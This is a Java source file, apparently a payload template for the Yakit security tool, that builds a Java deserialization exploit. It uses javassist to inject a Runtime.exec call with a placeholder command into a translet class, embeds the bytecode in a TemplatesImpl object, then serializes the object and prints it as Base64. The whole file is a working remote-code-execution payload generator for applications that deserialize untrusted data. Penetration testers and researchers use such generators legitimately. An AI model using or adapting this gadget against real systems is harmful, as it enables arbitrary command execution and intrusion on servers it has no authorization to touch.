import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Field;
import java.util.Base64;

public class ClassLoader {
    public static class TranslatePayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void setAccessible(AccessibleObject member) {
        String versionStr = System.getProperty("java.version");
        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);
        if (javaVersion < 12) {
            // quiet runtime warnings from JDK9+
            Permit.setAccessible(member);
        } else {
            // not possible to quiet runtime warnings anymore...
            // see https://bugs.openjdk.java.net/browse/JDK-8210522
            // to understand impact on Permit (i.e. it does not work
            // anymore with Java >= 12)
            member.setAccessible(true);
        }
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            setAccessible(field);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void main(String[] args) throws Exception {
        System.out.println("Hello World");

        Class<?> impl = TemplatesImpl.class;
        Class<?> absTranslet = AbstractTranslet.class;
        Class<?> factory = TransformerFactoryImpl.class;

        // 创建一个可以序列化的类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(TranslatePayload.class));
        pool.insertClassPath(new ClassClassPath(absTranslet));

        // 获取当前类
        final CtClass clazz = pool.get(TranslatePayload.class.getName());
        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"YAKIT_PLACEHOLDER\");");
        clazz.setName("test");
        clazz.setSuperclass(pool.get(absTranslet.getName()));

        final byte[] classBytes = clazz.toBytecode();
        System.out.println(new String(Base64.getEncoder().encode(classBytes)));

        final Object t = impl.newInstance();
        setFieldValue(t, "_bytecodes", new byte[][]{
                classBytes,
        });
        setFieldValue(t, "_name", "test");
        setFieldValue(t, "_tfactory", factory.newInstance());

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(out);
        oos.writeObject(t);

        System.out.println(new String(Base64.getEncoder().encode(out.toByteArray())));
    }
}
